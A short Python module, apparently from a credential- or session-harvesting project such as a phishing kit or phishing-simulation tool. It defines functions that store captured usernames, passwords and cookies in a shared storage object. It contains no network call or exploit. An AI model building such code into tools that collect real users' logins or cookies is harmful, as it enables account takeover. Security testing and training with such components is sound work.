from src.utils import storage

def capture_credentials(username: str, password: str):
    storage["credentials"].append({"username": username, "password": password})

def capture_cookies(cookies: dict):
    storage["cookies"].append(cookies)
